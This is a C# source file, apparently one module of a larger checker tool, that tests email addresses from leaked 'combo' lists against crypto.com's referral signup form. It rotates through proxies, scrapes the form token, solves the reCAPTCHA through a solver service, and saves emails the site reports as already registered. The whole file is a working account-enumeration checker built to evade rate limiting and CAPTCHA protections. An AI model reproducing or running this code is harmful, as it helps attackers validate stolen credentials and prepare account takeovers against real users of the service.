using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using UHQKEK.Start;
using Console = Colorful.Console;

namespace UHQKEK.Modules.VM
{
    class CryptoVM
    {
        public static bool check(string combo)
        {
            try
            {
                HttpRequest httpRequest = new HttpRequest()
                {
                    IgnoreProtocolErrors = true,
                    KeepAlive = true,
                    ConnectTimeout = 10000,
                    AllowEmptyHeaderValues = true
                };
                string[] strArray1 = combo.Split(':', ';', '|');
                string[] strArray2 = Program.Proxies.ElementAt<string>(new Random().Next(0, Program.Proxies.Count)).Split(':', ';', '|');
                ProxyClient proxyClient = Program.Proxytype == ProxyType.Socks5 ? new Socks5ProxyClient(strArray2[0], int.Parse(strArray2[1])) : Program.Proxytype == ProxyType.Socks4 ? new Socks4ProxyClient(strArray2[0], int.Parse(strArray2[1])) : (ProxyClient)new HttpProxyClient(strArray2[0], int.Parse(strArray2[1]));
                if (strArray2.Length == 4)
                {
                    proxyClient.Username = strArray2[2];
                    proxyClient.Password = strArray2[3];
                }
                httpRequest.Proxy = proxyClient;
                httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback)((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());

                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                httpRequest.AddHeader("Accept", "*/*");
                string str1 = httpRequest.Get("https://referral.crypto.com/signup").ToString();
                string authenticity = Cryptography.LR(str1, "name=\"authenticity_token\" value=\"", "\"").ToString();
                string capsol = Captchas.GetKey("https://referral.crypto.com/signup", "6LcrZtUZAAAAAK-nIC63dCwhG6MuaMS9IVd-pXaz").ToString();

                httpRequest.ClearAllHeaders();
                httpRequest.AllowAutoRedirect = true;
                httpRequest.AddHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
                httpRequest.AddHeader("Accept", "*/*");
                string str2 = httpRequest.Post("https://referral.crypto.com/signup", "utf8=%E2%9C%93&authenticity_token="+authenticity+ "&signup%5Breferral_code%5D=6msm6a4kpv&signup%5Bemail%5D="+strArray1[0]+ "&g-recaptcha-response="+capsol+ "&commit=Submit", "application/x-www-form-urlencoded").ToString();

                if (str2.Contains("This email is already in use") || str2.Contains("This email is already"))
                {
                    Interlocked.Increment(ref Program.Good);
                    ++Program.Check;
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine($" [+] {combo} ", Color.Green);
                    }
                    Program.Save(combo, "Crypto VM");
                    return true;
                }
                else if (str2.Contains("Congrats!") || str2.Contains("/success") || str2.Contains("Invalid Email")) 
                {
                    Interlocked.Increment(ref Program.Fail);
                    Interlocked.Increment(ref Program.Check);
                    ++Program.Cps;
                    Program.remove(combo);
                    if (Program.Lock == "Y")
                    {
                        Console.WriteLine("[-]" + combo, Color.Red);
                    }
                    ////Program.Save(combo, "Invalids");
                    return true;
                }
                else
                {
                    ++Program.Error;
                    return false;
                }
            }
            catch
            {
                ++Program.Error;
                return false;
            }
        }
    }
}
